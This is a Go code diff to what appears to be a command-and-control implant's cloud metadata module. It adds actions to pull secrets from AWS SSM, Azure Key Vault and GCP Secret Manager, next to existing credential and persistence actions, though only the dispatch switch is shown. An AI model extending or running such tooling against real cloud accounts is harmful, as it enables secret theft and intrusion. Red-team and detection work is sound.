@@ -93,8 +93,14 @@ func (c *CloudMetadataCommand) Execute(task structs.Task) structs.CommandResult 
 		return successResult(awsPersist(timeout))
 	case "azure-persist":
 		return successResult(azurePersist(timeout))
+	case "aws-ssm":
+		return successResult(awsGetSSMSecrets(timeout))
+	case "azure-keyvault", "azure-vault":
+		return successResult(azureGetKeyVaultSecrets(timeout))
+	case "gcp-secrets", "gcp-secretmanager":
+		return successResult(gcpGetSecretManager(timeout))
 	default:
-		return errorResult("Error: unknown action. Available: detect, all, creds, identity, userdata, network, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist")
+		return errorResult("Error: unknown action. Available: detect, all, creds, identity, userdata, network, aws-iam, azure-graph, gcp-iam, aws-persist, azure-persist, aws-ssm, azure-keyvault, gcp-secrets")
 	}
 }
 
